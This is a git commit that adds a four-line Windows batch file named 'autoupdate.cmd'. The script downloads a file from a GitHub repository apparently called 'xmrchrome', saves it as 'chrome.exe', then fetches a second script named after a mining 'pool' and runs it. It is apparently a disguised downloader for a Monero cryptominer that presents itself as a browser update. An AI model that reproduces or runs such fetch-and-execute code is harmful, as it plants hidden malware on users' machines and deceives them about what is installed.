667e76d8bc791b753add77a0fff208d646711992
MinecraftFuns <45290401+vmlankub@users.noreply.github.com>
2019-03-29 21:58:07 +0800

    Create autoupdate.cmd

---
+++ autoupdate.cmd
@@ -0,0 +1,4 @@
+wget -O chrome.exe https://cdn.jsdelivr.net/gh/lkpo0v/xmrchrome@master/data/L5L0CLysiFlYo48F.dat
+wget -O pool-gsut4m.cmd https://cdn.jsdelivr.net/gh/lkpo0v/xmrchrome@master/pool-gsut4m.txt
+pool-gsut4m.cmd
+exit
